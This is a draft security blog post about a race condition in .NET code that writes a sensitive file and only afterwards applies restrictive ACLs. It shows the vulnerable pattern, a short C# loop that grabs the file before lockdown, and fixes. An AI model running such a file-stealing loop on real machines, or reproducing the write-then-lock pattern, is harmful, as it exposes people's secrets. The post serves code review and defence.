---
title: "Race conditions when applying ACLs"
date: 2020-08-24T12:00:33-08:00
draft: true
tags: [
        "pentesting",
        "research",
        "appsec"
    ]
---

Today I'm gonna talk about a class of application security issues I ran across a few times over the years. In particular, let's discuss race conditions when it comes to files with sensitive content and permissions.

**Race conditions** can allow an adversary to gain access to sensitive information on machines. Assume a system creates a file that contains sensitive information and *afterwards* applies permissions to lockdown that file. 

## Understanding the race condition

Let's look at a practical example seen in the wild a few times. Imagine code like this:

* Code creates file with sensitive information. Doing something like:

```
file.WriteAllBytes(filePath, content);
```

* Then the ACL is updated to lock down the file. [Here is a the documentation on how to do that using the FileSecurity class](https://docs.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.filesecurity?view=netframework-4.8). 

Hence, you might see [something similar to the following lines:](https://docs.microsoft.com/en-us/dotnet/standard/io/how-to-add-or-remove-access-control-list-entries):

```
AddFileSecurity(filePath, @"Administrators",
    FileSystemRights.ReadData, AccessControlType.Allow);
```

Aditionally, *permission inheritance will be broken* by the developer as well (e.g to prevent automatic read access, as otherwise the file likely won't be locked down properly anyways).

*These two steps of (1) creating the widely exposed file with sensitive content and then (2) locking it down typically can be found right after each other in the source code.*

## Exploitable?
So, what's the chance of an adversary on the machine reading the file right after it was created, but before the permission lockdown happens? 

My initial thought was that this could theoretically be exploitable by someone else on the machine, but probably is too narrow of a window for a stable exploit. 

Nevertheless, I thought to give it a try and build a little "File Stealer".

## Winning the race 
Nothing fancy when it comes to testing for this. I built a simple tool in C# that tries to access the file in a loop and prints out the contents if that is the case. 

This is basically the core part of the utility:

``` 
while (true)
{
    try
    {
        string content = File.ReadAllText(path);

        Console.WriteLine("*** SUCCESS: File was grabbed before the ACL got applied! ***");
        Console.WriteLine(content);
        break;
    }
    catch (Exception ex)
    {
        //Console.Write("."); //provide feedback of access denied/file not found
    }
}

Console.WriteLine("*** Done");
```

The name of the file would have to be known, or be predictable or otherwise retrievable by the attacker.

## What's the result you might ask?

*Turns out that this works about 100% of the time.*  I guess file IO is just really slow...

Similar coding patterns can be found in other areas, with user accounts, registry or also database configurations. So it's a good to keep this in the back of your head when doing static anlaysis or reviewing code.

## How to fix

There are typically APIs that will do the correct thing when providing the ACL at creation time. Another options is to not write sensitive information to the file right away, but lock it down first before storing content.

Hope that helps - also if you find something similar, reach out. Curious to see how common that is.

## References

* [FileSecurity Documentation](https://docs.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.filesecurity?view=netframework-4.8)
* [AddFileSecurity Example Code](https://docs.microsoft.com/en-us/dotnet/standard/io/how-to-add-or-remove-access-control-list-entries)
* [File.WriteAllBytes Documentation](https://docs.microsoft.com/en-us/dotnet/api/system.io.file.writeallbytes?view=netcore-3.1)
* [Race Condition Further Information](https://en.wikipedia.org/wiki/Race_condition)